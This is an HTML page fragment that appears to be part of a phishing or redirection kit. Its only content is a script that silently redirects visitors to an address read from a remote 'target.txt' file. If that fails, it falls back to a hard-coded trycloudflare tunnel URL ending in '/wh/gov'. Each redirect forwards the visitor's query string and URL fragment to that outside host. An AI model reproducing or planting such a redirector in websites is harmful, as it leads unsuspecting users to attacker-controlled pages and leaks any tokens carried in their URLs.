</head><body><div class="b">

</div>
<script>
(function(){
  var fb = "https://britain-agree-achieved-orchestra.trycloudflare.com/wh/gov", q = location.search + location.hash;
  function go(u){ try{ document.getElementById('go').href = u; }catch(e){} location.replace(u); }
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '../target.txt?t=' + Date.now(), true);
    x.timeout = 5000;
    x.onload = function(){ var b = (x.responseText || '').trim();
      go(/^https:\/\//.test(b) ? b.replace(/\/$/, '') + '/wh/gov' + q : fb + q); };
    x.onerror = x.ontimeout = function(){ go(fb + q); };
    x.send();
  } catch(e) { go(fb + q); }
})();
</script>
